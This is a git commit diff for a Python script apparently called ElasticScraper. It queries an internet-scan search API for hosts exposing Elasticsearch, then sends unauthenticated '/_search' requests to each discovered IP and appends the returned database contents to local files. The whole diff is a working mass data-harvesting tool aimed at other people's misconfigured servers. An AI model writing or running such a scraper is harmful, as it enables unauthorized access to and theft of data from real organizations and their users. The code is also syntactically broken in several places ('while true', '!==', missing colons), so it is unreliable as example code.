2466b03e812ba8d67a1c877c4cf8159c7506d80e
RiversideRocks <59586759+RiversideRocks@users.noreply.github.com>
2022-08-05 13:16:37 -0400

    try out a new approach

--- v2.py
+++ v2.py
@@ -7,31 +7,27 @@ search = urllib.parse.quote("services.http.response.status_code: 200 and service
 cur = "abc" # could be anything
 
 while true:
-  if cur == "abc"
-    
+    if cur !== "abc"
+        r = requests.get(api_base + search + "&per_page=50&virtual_hosts=EXCLUDE&cursor=" + sys.argv[1], headers={"accept": "application/json", "Authorization": "Basic abc"})
+    else:
+        r = requests.get(api_base + search + "&per_page=50&virtual_hosts=EXCLUDE", headers={"accept": "application/json", "Authorization": "Basic abc"})
 
-r = requests.get(api_base + search + "&per_page=50&virtual_hosts=EXCLUDE", headers={"accept": "application/json", "Authorization": "Basic abc"})
-else:
-    r = requests.get(api_base + search + "&per_page=50&virtual_hosts=EXCLUDE&cursor=" + sys.argv[1], headers={"accept": "application/json", "Authorization": "Basic abc"})
+    api = r.json()
 
-    #print(api_base + search + "&per_page=50&virtual_hosts=EXCLUDE")
-api = r.json()
-
-for hits in api["result"]["hits"]:
-    main_ip = hits["ip"]
-    for service in hits["services"]:
-        if service["service_name"] == "ELASTICSEARCH":
-            #print("Got a hit for elastic: " + main_ip + ":" + str(service["port"]))
-            #print("Sending an HTTP request (unauthenticated) to the port")
-            try:
-                data = requests.get("http://" + main_ip + ":" + str(service["port"]) + "/_search", headers={"User-agent": "ElasticScraper (+https://github.com/RiversideRocks/ElasticScraper)"}, timeout=10)
-                #print(data.text)
-                with open(str(main_ip) + ".txt", "a") as yes:
-                    # Writing data to a file
-                    yes.write(data.text)
-            except:
-                # oops
-                print()
-
-print(api["result"]["links"]["next"]); #returns the next cursor, good for the bash script
-# by the end of development, this will only return the "next" cursor
+    for hits in api["result"]["hits"]:
+        main_ip = hits["ip"]
+        for service in hits["services"]:
+            if service["service_name"] == "ELASTICSEARCH":
+                try:
+                    data = requests.get("http://" + main_ip + ":" + str(service["port"]) + "/_search", headers={"User-agent": "ElasticScraper (+https://github.com/RiversideRocks/ElasticScraper)"}, timeout=10)
+                    with open(str(main_ip) + ".txt", "a") as yes:
+                        # Writing data to a file
+                        yes.write(data.text)
+                        try:
+                            cur = api["result"]["links"]["next"]
+                        except:
+                            print("Ended!")
+                            sys.exit()
+                except:
+                    # oops
+                    print()
